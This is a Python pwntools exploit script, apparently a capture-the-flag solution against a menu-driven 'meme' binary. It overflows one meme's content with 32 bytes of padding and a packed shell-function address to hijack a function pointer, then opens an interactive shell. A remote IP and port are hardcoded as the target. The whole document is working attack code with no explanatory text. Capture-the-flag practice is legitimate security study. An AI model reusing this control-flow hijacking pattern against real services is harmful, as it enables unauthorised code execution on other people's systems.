#!/usr/bin/env python3

from pwn import *
from struct import pack

exe = ELF("./ez", checksec=False)

context.binary = exe
context.log_level = "CRITICAL"
context.terminal = ["konsole", "-e"]

REMOTE = ("103.185.38.238", 15733)
SHELL_ADDRESS = 0x4014a4

args.local = True
args.debug = True
if args.local == False:
    args.debug = False 


class Exploit:
    def __init__(self):
        if args.local:
            self.process = "process()"
        else:
            self.process = "remote(REMOTE[0], REMOTE[1])"
        self.debug = args.debug
        
    def make_new_meme(self, proc: process):
        proc.sendafter(b'Choice: ', b'1\n')
        proc.sendafter(b'size: ', b'1\n')
        proc.sendafter(b'content:', b'A' +b"\n")
        return None
        
    def edit_meme_and_make_bufferoverflow(self, proc: process):
        proc.sendafter(b'Choice: ', b'2\n')
        proc.sendafter(b'Index: ', b'0\n')
        proc.sendafter(b'content: ', b'A' * 32 + pack("<I", SHELL_ADDRESS) + b"\n")
        return None
    
    def triger_bufferoverflow(self, proc: process):
        '''trigger the buffer overflow'''
        proc.sendafter(b'Choice: ', b'3\n')
        proc.sendafter(b'Index: ', b'1\n')
        return None
    
    def conn(self, proc: process):
        self.make_new_meme(proc)
        self.make_new_meme(proc)
        self.edit_meme_and_make_bufferoverflow(proc)
        self.triger_bufferoverflow(proc)
        return None
    
    def attach_gdb(self, proc: process):
        script = """
        source /usr/share/pwndbg/gdbinit.py
        # source /usr/share/peda/peda.py
        # source /usr/share/gef/gef.py
        
        set step-mode on
        set pagination off
        set logging off
        
        break print_meme
        """
        gdb.attach(proc, gdbscript=script)
        return None
        
    
    def start(self):
        '''start the exploit'''
        proc: process = eval(self.process)
        if self.debug:
            self.attach_gdb(proc)
        self.conn(proc)
        proc.interactive()
        proc.close()
        return None


if __name__ == "__main__":
    Exploit().start()